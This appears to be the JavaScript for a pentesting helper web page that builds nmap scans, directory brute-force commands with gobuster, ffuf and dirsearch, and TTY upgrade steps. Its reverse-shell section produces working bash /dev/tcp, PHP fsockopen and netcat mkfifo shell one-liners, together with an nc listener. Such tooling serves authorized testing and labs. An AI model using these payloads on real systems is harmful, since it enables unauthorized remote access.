/*!
* Start Bootstrap - Business Frontpage v5.0.9 (https://startbootstrap.com/template/business-frontpage)
* Copyright 2013-2023 Start Bootstrap
* Licensed under MIT (https://github.com/StartBootstrap/startbootstrap-business-frontpage/blob/master/LICENSE)
*/

document.addEventListener("DOMContentLoaded", () => {
    
    // --- FUNCIÓN GLOBAL PARA LOGUEAR (API) ---
    function logToHistory(commandText) {
        if (!commandText) return;
        const cleanCmd = commandText.trim();
        if (cleanCmd.startsWith("Completa") || cleanCmd.startsWith("Esperando")) return;

        fetch('/api/log_command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ command: cleanCmd })
        })
        .then(res => res.json())
        .catch(err => console.error("Error guardando historial:", err));
    }

    // -----------------------------------------------------------------------
    // --- LÓGICA DE CLIPBOARD (GENÉRICA Y ROBUSTA) ---
    const copyButtons = document.querySelectorAll(".btn-copy");

    copyButtons.forEach(btn => {
        btn.addEventListener("click", () => {
            // 1. Buscamos qué elemento hay que copiar
            const targetId = btn.getAttribute("data-target");
            
            // Si el botón no tiene target, quizas es un boton dinamico (TTY), salimos
            if (!targetId) return; 

            const targetEl = document.getElementById(targetId);
            if (!targetEl) return;

            // 2. CORRECCIÓN IMPORTANTE:
            // Si es un Input/Textarea usamos .value, si es un Div/Span usamos .innerText
            let textToCopy = "";
            if (targetEl.tagName === 'INPUT' || targetEl.tagName === 'TEXTAREA') {
                textToCopy = targetEl.value;
            } else {
                textToCopy = targetEl.innerText;
            }

            // 3. Copiamos usando la función visual auxiliar
            copyText(textToCopy, btn);

            // 4. Guardamos en historial
            logToHistory(textToCopy);
        });
    });

    // Función auxiliar visual para copiar (Funciona sin HTTPS)
    function copyText(text, btnElement) {
        if (!text) return; // No copiar vacíos

        const textArea = document.createElement("textarea");
        textArea.value = text;
        textArea.style.position = "fixed"; 
        textArea.style.left = "-9999px";
        document.body.appendChild(textArea);
        textArea.select();

        try {
            document.execCommand("copy");
            
            // Feedback visual
            const originalHtml = btnElement.innerHTML;
            btnElement.classList.add("copiado");
            btnElement.innerHTML = '<i class="bi bi-check-lg"></i>'; // Icono tick
            
            setTimeout(() => {
                btnElement.classList.remove("copiado");
                btnElement.innerHTML = originalHtml;
            }, 1500);

        } catch (err) {
            console.error("Error al copiar", err);
        }
        document.body.removeChild(textArea);
    }

    // -----------------------------------------------------------------------
    // --- LÓGICA DE NMAP ---
    const nmapIpInput = document.getElementById('nmap_ip');
    const nmapSelect = document.getElementById('nmap_type');

    if (nmapIpInput && nmapSelect && window.nmapDataDB) {
        
        const nmapContainer = document.getElementById('nmap-output-container');
        const nmapOutput = document.getElementById('nmap-output-text');
        // NOTA: Ya no necesitamos seleccionar el botón aquí, lo maneja la lógica genérica de arriba

        function updateNmapCommand() {
            const scanKey = nmapSelect.value;
            let ip = nmapIpInput.value.trim();
            
            if (!ip) ip = "{target_ip}";

            if (!scanKey) {
                nmapContainer.style.display = 'none';
                return;
            }

            const rawCommand = window.nmapDataDB[scanKey];

            if (rawCommand) {
                nmapContainer.style.display = 'block';
                nmapOutput.value = rawCommand.replace('{ip}', ip);
            }
        }

        nmapSelect.addEventListener('change', updateNmapCommand);
        nmapIpInput.addEventListener('input', updateNmapCommand);
    }

    // -----------------------------------------------------------------------
    // --- LÓGICA DE REVERSHELL ---
    const rsHost = document.getElementById("lhost");
    if (rsHost) {
        const rsPort = document.getElementById("lport");
        const rsOutput = document.getElementById("output");
        const rsListener = document.getElementById("listener");
        const rsUrlEncode = document.getElementById("urlencode");
        const rsCards = document.querySelectorAll(".shell-card");

        function generateShell() {
            // Si falta IP o Puerto, mostramos mensaje de espera
            if (!rsHost.value || !rsPort.value) {
                rsOutput.innerText = "Completa IP y Puerto arriba...";
                rsListener.innerText = "nc -lvnp <PUERTO>";
                return;
            }

            let ip = rsHost.value.trim();
            let p = rsPort.value.trim();

            // Lógica de URL Encode
            if (rsUrlEncode.checked) {
                ip = encodeURIComponent(ip);
                p = encodeURIComponent(p);
            }

            // Detectar cuál está activa
            const activeCard = document.querySelector(".shell-card.active input");
            const type = activeCard ? activeCard.value : 'bash';

            let command = "";
            switch (type) {
                case 'bash':
                    command = `bash -i >& /dev/tcp/${ip}/${p} 0>&1`;
                    break;
                case 'php':
                    // Payload PHP robusto para web shells
                    command = `php -r '$sock=fsockopen("${ip}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`;
                    break;
                case 'nc':
                    // Payload Netcat mkfifo (el más común)
                    command = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${p} >/tmp/f`;
                    break;
                default:
                    command = `bash -i >& /dev/tcp/${ip}/${p} 0>&1`;
            }

            // Inyectamos texto (innerText) para que el botón de copiar genérico lo lea bien
            rsOutput.innerText = command;
            rsListener.innerText = `nc -lvnp ${rsPort.value}`; // Listener siempre usa el puerto sin encode
        }

        // Eventos para las tarjetas (click visual y lógica)
        rsCards.forEach(card => {
            card.addEventListener("click", () => {
                rsCards.forEach(c => c.classList.remove("active"));
                card.classList.add("active");
                const radio = card.querySelector("input");
                if(radio) radio.checked = true;
                generateShell();
            });
        });

        // Eventos para los inputs
        [rsHost, rsPort, rsUrlEncode].forEach(el => {
            el.addEventListener("input", generateShell);
            el.addEventListener("change", generateShell);
        });

        // --- IMPORTANTE: Ejecutar al inicio para rellenar datos si ya hay IP ---
        generateShell();
    }

    // -----------------------------------------------------------------------
    // --- LÓGICA DE TTY ---
    const ttySelect = document.getElementById('tty_select');

    if (ttySelect && window.ttyDataDB) {
        const dom = {
            container: document.getElementById('tty-output-container'),
            title: document.getElementById('tty-title-display'),
            desc: document.getElementById('tty-desc-display'),
            list: document.getElementById('tty-commands-list'),
            notesBox: document.getElementById('tty-notes-box'),
            notesText: document.getElementById('tty-notes-text')
        };

        ttySelect.addEventListener('change', function() {
            const key = this.value;
            const data = window.ttyDataDB[key];

            if (!key || !data) {
                dom.container.style.display = 'none';
                return;
            }

            dom.container.style.display = 'block';
            dom.title.innerText = "> " + data.name;
            dom.desc.innerText = data.description || "TTY Upgrade";
            dom.list.innerHTML = ''; 

            if (Array.isArray(data.commands)) {
                const fragment = document.createDocumentFragment(); 

                data.commands.forEach((cmd, index) => {
                    const row = document.createElement('div');
                    row.className = "d-flex align-items-center mb-2 terminal-row";

                    const num = document.createElement('span');
                    num.className = "me-3 select-none text-muted";
                    num.innerText = `${index + 1}.`;

                    const input = document.createElement('input');
                    input.type = "text";
                    input.className = "form-control terminal-input"; 
                    input.value = cmd;
                    input.readOnly = true;

                    const btn = document.createElement('button');
                    btn.className = "btn-copy ms-2";
                    btn.title = "Copiar línea";
                    btn.innerHTML = '<i class="bi bi-clipboard"></i>';

                    // Aquí usamos la lógica directa porque es contenido dinámico
                    btn.onclick = () => {
                        copyText(cmd, btn);
                        logToHistory(cmd); 
                    };

                    row.appendChild(num);
                    row.appendChild(input);
                    row.appendChild(btn);
                    fragment.appendChild(row); 
                });

                dom.list.appendChild(fragment); 
            }

            if (data.notes) {
                dom.notesBox.style.display = 'block';
                dom.notesText.innerText = data.notes;
            } else {
                dom.notesBox.style.display = 'none';
            }
        });
    }

// -----------------------------------------------------------------------
    // --- LÓGICA DE DISCOVERY ---
    const discoUrl = document.getElementById("disco_url");
    
    // Verificamos que existan los elementos y la base de datos de Python
    if (discoUrl && window.discoveryToolsDB) {
        const discoWordlist = document.getElementById("disco_wordlist");
        const discoExt = document.getElementById("disco_extensions");
        const discoTool = document.getElementById("disco_tool");
        
        const discoContainer = document.getElementById("disco-output-container");
        const discoText = document.getElementById("disco-output-text");

        function updateDiscoveryCommand() {
            let url = discoUrl.value.trim();
            const wordlist = discoWordlist.value.trim() || "/usr/share/wordlists/dirb/common.txt";
            let extensions = discoExt.value.trim();
            const toolKey = discoTool.value; // 'gobuster', 'ffuf', etc.

            if (!url) {
                discoContainer.style.display = "none";
                return;
            }

            // 1. Recuperamos la plantilla base desde Python (DB)
            // Ejemplo plantilla: "gobuster dir -u {url} -w {wordlist} {extensions}"
            let rawCommand = window.discoveryToolsDB[toolKey];
            
            if (!rawCommand) {
                console.error("Herramienta no encontrada en DB:", toolKey);
                return;
            }

            // 2. Pre-procesamiento de variables específicas por herramienta
            let extString = "";

            if (toolKey === 'ffuf') {
                // Lógica específica FFUF: Añadir FUZZ si falta
                if (!url.includes("FUZZ")) {
                    url = url.endsWith("/") ? `${url}FUZZ` : `${url}/FUZZ`;
                }
                // Extensiones con punto (-e .php,.html)
                if (extensions) {
                    const extArray = extensions.split(',').map(e => e.trim().startsWith('.') ? e.trim() : `.${e.trim()}`);
                    extString = `-e ${extArray.join(',')}`;
                }
            } 
            else if (toolKey === 'gobuster') {
                // Extensiones sin punto y bandera -x
                if (extensions) {
                    const cleanExt = extensions.replace(/\./g, ''); 
                    extString = `-x ${cleanExt}`;
                }
            }
            else if (toolKey === 'dirsearch') {
                // Extensiones sin punto y bandera -e
                if (extensions) {
                    const cleanExt = extensions.replace(/\./g, '');
                    extString = `-e ${cleanExt}`;
                }
            }

            // 3. Relleno de la plantilla (Interpolación)
            let finalCommand = rawCommand
                .replace('{url}', url)
                .replace('{wordlist}', wordlist)
                .replace('{extensions}', extString);

            // Limpieza final (por si {extensions} quedó vacío, quitar espacios dobles)
            finalCommand = finalCommand.replace(/\s+/g, ' ').trim();

            // 4. Mostrar resultado
            discoContainer.style.display = "block";
            discoText.innerText = finalCommand;
        }

        // Listeners
        [discoUrl, discoWordlist, discoExt, discoTool].forEach(el => {
            el.addEventListener("input", updateDiscoveryCommand);
            el.addEventListener("change", updateDiscoveryCommand);
        });

        // Ejecutar una vez al inicio
        updateDiscoveryCommand();
    }

    // -----------------------------------------------------------------------
    // --- AUTO DISMISS ALERTS ---
    const flashMessages = document.querySelectorAll(".auto-dismiss");
    flashMessages.forEach(msg => {
        setTimeout(() => {
            msg.style.transition = "opacity 0.5s ease";
            msg.style.opacity = "0";
            setTimeout(() => {
                msg.remove();
            }, 500); 
        }, 1000);
    });
});